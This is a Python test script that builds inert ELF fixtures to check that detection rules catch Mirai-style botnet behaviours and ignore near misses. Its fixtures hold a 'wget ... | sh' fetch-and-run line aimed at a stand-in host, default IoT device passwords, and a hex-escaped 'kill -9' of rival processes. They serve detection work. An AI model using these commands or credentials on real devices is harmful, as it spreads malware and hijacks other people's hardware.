#!/usr/bin/env python3
"""Exercise native behavior rules with inert ELF fixtures and near misses."""
import argparse
import json
import os
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
RC4 = "micro-behaviors/crypto/symmetric/stream/rc4::"
KILL = "micro-behaviors/process/terminate/command::hex-escaped-deleted-suffix-kill"
DECODE = "micro-behaviors/data/decode/hex::busybox-echo-hex-escape-staging"
IMPACT = "objectives/impact/degrade/rival-bot/competitor::credential-stager-deleted-image-killer"
MALFORMED = "micro-behaviors/communications/http/get::malformed-get-path-request"
ROUTE = "micro-behaviors/communications/http/url/endpoint::rest-admin-config-user-endpoints"
REMOVED = "micro-behaviors/os/security/kernel::kern-securelevel"

# Instruction windows contain no entry point, addresses, keys or endpoints.
LOOPS = [
    (40, "<", "arm-rc4-prga-buffer-transform", "01 3C 8D E2 04 10 83 E0 00 31 51 E5 00 21 50 E5 02 30 83 E0 FF 30 03 E2 01 1C 8D E2 03 20 81 E0 00 11 52 E5 06 30 D5 E7 01 30 23 E0 06 30 C5 E7 01 50 85 E2 07 00 55 E1"),
    (20, ">", "powerpc-rc4-prga-buffer-transform", "89 2B 00 08 88 08 00 08 7D 4C 18 AE 7C 00 4A 14 54 00 06 3E 7D 21 02 14 89 69 00 08 7D 4A 5A 78 7D 4C 19 AE 39 8C 00 01"),
    (8, ">", "mips-be-rc4-prga-buffer-transform", "30 62 00 FF 90 A3 00 00 90 E4 00 00 00 43 10 21 30 42 00 FF 01 42 10 21 90 43 00 00 00 00 00 00 00 83 20 26 A0 E4 00 00"),
]


def elf(rodata=b"", code=b"", machine=40, endian="<"):
    """Minimal relocatable ELF32: non-executable fixture, named sections."""
    names = b"\0.text\0.rodata\0.shstrtab\0"
    textoff = 64
    rodoff = (textoff + len(code) + 15) & ~15
    nameoff = rodoff + len(rodata)
    shoff = (nameoff + len(names) + 15) & ~15
    data = bytearray(shoff + 4 * 40)
    ident = b"\x7fELF\x01" + bytes([1 if endian == "<" else 2, 1]) + bytes(9)
    data[:52] = struct.pack(endian + "16sHHIIIIIHHHHHH", ident, 1, machine,
                           1, 0, 0, shoff, 0, 52, 0, 0, 40, 4, 3)
    data[textoff:textoff + len(code)] = code
    data[rodoff:rodoff + len(rodata)] = rodata
    data[nameoff:nameoff + len(names)] = names
    for index, name, flags, offset, size in [
        (1, 1, 6, textoff, len(code)),
        (2, 7, 2, rodoff, len(rodata)),
        (3, 15, 0, nameoff, len(names)),
    ]:
        data[shoff + index * 40:shoff + (index + 1) * 40] = struct.pack(
            endian + "IIIIIIIIII", name, 1 if index < 3 else 3, flags,
            0, offset, size, 0, 0, 1, 0)
    return bytes(data)


def escaped(text, lower=False):
    fmt = "\\x{:02x}" if lower else "\\x{:02X}"
    return b'"' + "".join(fmt.format(c) for c in text.encode()).encode() + b'"'


def reports(output):
    decoder = json.JSONDecoder()
    while output.strip():
        value, end = decoder.raw_decode(output.lstrip())
        yield from value["files"]
        output = output.lstrip()[end:]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--cleave", default="cleave")
    args = parser.parse_args()
    cases = []

    def case(name, data, yes=(), no=()):
        cases.append((name, data, set(yes), set(no)))

    # Different variable names, escape case and chunk boundaries must work.
    selection = '${link_text%(deleted)}'
    terminate = 'kill -9 "$process_id"'
    script = escaped(selection) + bytes(12) + escaped(terminate)
    staging = b"xc3511\0Zte521\0/bin/busybox\0/proc/%d/exe\0/fd/\0"
    staging += b"wget http://host.invalid/wget.sh -O- | sh\0chmod +x .p; ./.p\0"
    echo = b"/bin/busybox echo -ne \0"
    case("maintenance.elf", elf(script), [KILL], [IMPACT, DECODE])
    case("lowercase.elf", elf(escaped(selection, True) + escaped(terminate, True)),
         [KILL], [IMPACT])
    case("no-kill.elf", elf(escaped(selection) + escaped('echo "$process_id"')),
         no=[KILL, IMPACT])
    case("no-filter.elf", elf(escaped(terminate)), no=[KILL, IMPACT])
    case("too-distant.elf", elf(escaped(selection) + bytes(300) + escaped(terminate)),
         no=[KILL, IMPACT])
    case("credential-stager.elf", elf(staging + echo + script),
         [KILL, DECODE, IMPACT])
    case("without-credentials.elf", elf(echo + script), [KILL, DECODE], [IMPACT])
    case("echo-prefix-only.elf", elf(echo), no=[DECODE])
    case("fingerprint.elf", elf(b"GET/dlr.\0/config/\0KERN_SECURELEVEL\0" + bytes(512)),
         no=[MALFORMED, ROUTE, REMOVED])
    case("malformed-request.elf", elf(b"GET/payload.arm HTTP/1.0\r\n\0" + bytes(512)),
         [MALFORMED])
    case("routes.js", b'app.get("/config", handler); app.post("/users", handler);',
         [ROUTE])
    case("filesystem.js", b'const paths = ["/config/", "/users/"];', no=[ROUTE])
    for machine, endian, trait, window in LOOPS:
        code = bytes.fromhex(window)
        all_rc4 = {RC4 + t[2] for t in LOOPS}
        case(trait + ".elf", elf(code=code, machine=machine, endian=endian),
             [RC4 + trait], all_rc4 - {RC4 + trait})
        # Removing the XOR instruction refutes the complete transform.
        changed = bytearray(code)
        xor_offset = {40: 44, 20: 28, 8: 32}[machine]
        changed[xor_offset:xor_offset + 4] = bytes(4)
        case(trait + "-no-xor.elf", elf(code=changed, machine=machine, endian=endian),
             no=all_rc4)

    with tempfile.TemporaryDirectory(prefix="mirai-rule-controls-") as tmp:
        targets = []
        for name, data, _, _ in cases:
            target = Path(tmp) / name
            target.write_bytes(data)
            targets.append(str(target))
        result = subprocess.run([
            args.cleave, "--no-update-check", "--traits-dir", str(ROOT),
            "--disable", "yara,radare2,upx", "--format", "json", "analyze",
            *targets,
        ], capture_output=True, text=True, check=True,
           env={**os.environ, "CLEAVE_SKIP_CACHE": "1"})
        files = {Path(f["path"]).name: f for f in reports(result.stdout)}
        for name, _, yes, no in cases:
            ids = {t["id"] for t in files[name].get("traits", [])}
            assert yes <= ids, (name, "missing", yes - ids)
            assert not no & ids, (name, "unexpected", no & ids)
            print("PASS", name)
    print(f"{len(cases)} controls passed")


if __name__ == "__main__":
    main()
